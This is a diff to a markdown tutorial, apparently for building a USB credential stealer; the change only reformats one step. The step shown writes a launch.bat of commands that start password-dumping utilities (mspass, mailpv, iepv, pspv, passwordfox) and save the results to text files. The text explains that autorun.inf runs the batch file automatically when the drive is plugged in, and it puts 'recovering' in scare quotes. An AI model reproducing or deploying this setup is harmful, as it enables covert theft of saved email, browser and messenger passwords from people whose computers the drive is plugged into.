@@ -41,21 +41,19 @@ Now copy the autorun.inf file onto your USB Pendrive.
 
 1. Create another Notepad and write the following text onto it.
 
-```restructuredtext
-start mspass.exe /stext mspass.txt
+   ```
+   start mspass.exe /stext mspass.txt
 
-start mailpv.exe /stext mailpv.txt
+   start mailpv.exe /stext mailpv.txt
 
-start iepv.exe /stext iepv.txt
+   start iepv.exe /stext iepv.txt
 
-start pspv.exe /stext pspv.txt
+   start pspv.exe /stext pspv.txt
 
-start passwordfox.exe /stext passwordfox.txt
-```
-
-Save the Notepad and rename it from New Text Document.txt to launch.bat
-
-Copy the launch.bat file also to your USB drive.
+   start passwordfox.exe /stext passwordfox.txt
+   ```
+2. Save the Notepad and rename it from New Text Document.txt to launch.bat
+3. Copy the launch.bat file also to your USB drive.
 
 These were simple commands to start up our password “recovering” programs as soon as we plug in the USB. What we just did here is simply hook up our launch.bat batch file to the autorun.inf file that automatically runs when the computer detects the USB. In the launch.bat, we started up our programs and provided them with file names as parameters so that each program should put in the passwords in their respective .txt files.
 
